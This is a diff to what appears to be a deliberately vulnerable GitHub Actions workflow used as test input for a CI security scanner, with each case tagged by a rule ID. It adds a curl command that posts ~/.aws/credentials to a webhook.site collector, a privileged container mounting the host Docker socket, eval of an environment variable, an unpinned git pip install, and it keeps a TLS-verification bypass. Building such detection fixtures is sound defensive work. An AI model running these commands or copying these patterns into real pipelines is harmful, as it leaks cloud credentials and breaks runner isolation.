@@ -67,6 +67,20 @@ jobs:
     steps:
       - run: echo "deploying to prod"
 
+  # GHA-025: reusable-workflow ``uses:`` pinned to a floating tag.
+  call-shared:
+    uses: myorg/shared/.github/workflows/release.yml@v1
+
+  # GHA-026: container job runs with host-network + privileged docker,
+  # mounting the host Docker socket — breaks runner isolation.
+  container-escape:
+    runs-on: ubuntu-latest
+    container:
+      image: debian:bookworm
+      options: --privileged --network host -v /var/run/docker.sock:/var/run/docker.sock
+    steps:
+      - run: docker info
+
   ingest-upstream:
     # GHA-009: downloads an artifact from the workflow_run trigger
     # WITHOUT cosign verify / `gh attestation verify` / sha256sum -c.
@@ -97,3 +111,13 @@ jobs:
       - run: pip install --upgrade requests
       # GHA-023: TLS verification bypass.
       - run: git config --global http.sslVerify false
+      # GHA-027: evidence of malicious activity — credential exfil to
+      # a webhook.site collector (distinct from hygiene warnings — a
+      # real compromise indicator).
+      - run: curl -d @~/.aws/credentials https://webhook.site/abc-123/collect
+      # GHA-028: dangerous shell idiom — eval re-parses the value of
+      # ``$DEPLOY_CMD`` as shell.
+      - run: eval "$DEPLOY_CMD"
+      # GHA-029: pip install from an unpinned git URL — lockfile
+      # cannot protect against a moving branch head on the remote.
+      - run: pip install git+https://example.com/internal/helper.git
